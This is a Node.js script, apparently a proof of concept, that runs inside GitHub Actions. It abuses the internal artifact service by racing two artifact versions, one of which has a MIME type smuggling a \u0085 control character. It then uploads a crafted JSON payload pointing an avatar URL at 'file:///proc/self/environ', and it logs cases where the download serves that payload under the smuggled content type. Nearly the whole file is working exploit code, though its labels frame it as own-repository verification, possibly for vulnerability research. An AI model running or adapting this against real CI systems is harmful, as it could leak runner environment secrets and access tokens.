import { createHash } from 'node:crypto';
import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';

const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
const ghToken = process.env.GH_TOKEN;
if (!runtimeToken || !ghToken) throw new Error('Required runtime credentials unavailable');
const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient();
const repo = process.env.GITHUB_REPOSITORY;
const run = process.env.GITHUB_RUN_ID;
const weird = '\u0085application/json';
const safe = 'application/json';
const placeholder = Buffer.from('{"probe":"placeholder"}');
const digest = createHash('sha256').update(placeholder).digest('hex');
const cases = Number(process.env.CASES || 48);
const parallel = 4;

async function create(name, version, mimeType) {
  const r = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version,
    mimeType: StringValue.create({ value: mimeType }),
  });
  if (!r.ok || !r.signedUploadUrl) throw new Error('CreateArtifact failed');
  return r;
}
async function upload(url, body) {
  await new BlobClient(url).getBlockBlobClient().uploadData(body, {
    blobHTTPHeaders: { blobContentType: weird },
  });
}
async function finalize(name) {
  const r = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(placeholder.length),
    hash: StringValue.create({ value: `sha256:${digest}` }),
  });
  if (!r.ok || !r.artifactId) throw new Error('FinalizeArtifact failed');
  return String(r.artifactId);
}
function payload(id) {
  return Buffer.from(JSON.stringify({
    full_name: `${repo}/actions/artifacts/${id}/zip`,
    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
    description: 'Own-repo MIME race verification',
    stargazers_count: 0,
  }));
}
async function inspect(id) {
  const url = `https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`;
  const response = await fetch(url, {
    redirect: 'manual',
    headers: {
      authorization: `Bearer ${ghToken}`,
      accept: 'application/vnd.github+json',
      'x-github-api-version': '2022-11-28',
      'user-agent': 'repo-cassette-own-mime-verification',
    },
  });
  const location = response.headers.get('location');
  let rsct = null;
  let raw = null;
  let rawType = null;
  let exact = false;
  if (location) {
    const parsed = new URL(location);
    rsct = parsed.searchParams.get('rsct');
    const data = await fetch(location);
    rawType = data.headers.get('content-type');
    raw = Buffer.from(await data.arrayBuffer());
    exact = raw.equals(payload(id));
  }
  return { id, status: response.status, rsct, rawType, rawBytes: raw?.length ?? null, exact };
}
async function race(i) {
  const name = `cassette-own-v6v7-${run}-${i}`;
  const pairs = i % 2 ? [[7, safe], [6, weird]] : [[6, weird], [7, safe]];
  const created = await Promise.all(pairs.map(([v, m]) => create(name, v, m)));
  await Promise.all(created.map(x => upload(x.signedUploadUrl, placeholder)));
  const finals = await Promise.allSettled([finalize(name), finalize(name)]);
  const artifactIds = [...new Set(finals.filter(x => x.status === 'fulfilled').map(x => x.value))];
  if (!artifactIds.length) throw new Error('no artifact finalized');
  for (const id of artifactIds) {
    const bytes = payload(id);
    await Promise.all(created.map(x => upload(x.signedUploadUrl, bytes)));
  }
  const observed = [];
  for (const id of artifactIds) observed.push(await inspect(id));
  const row = { i, artifactIds, observed };
  console.log(JSON.stringify(row));
  if (observed.some(x => x.exact && (x.rawType || '').includes('\u0085'))) {
    console.log(`POTENTIAL_WINNER ${JSON.stringify(row)}`);
  }
  return row;
}
let success = 0;
for (let start = 0; start < cases; start += parallel) {
  const batch = Array.from({ length: Math.min(parallel, cases - start) }, (_, j) => start + j);
  const rows = await Promise.allSettled(batch.map(race));
  success += rows.filter(x => x.status === 'fulfilled').length;
  for (const result of rows.filter(x => x.status === 'rejected')) {
    console.log(`CASE_ERROR ${String(result.reason?.message || result.reason).slice(0, 180)}`);
  }
}
console.log(`SUMMARY ${JSON.stringify({ cases, completed: success })}`);

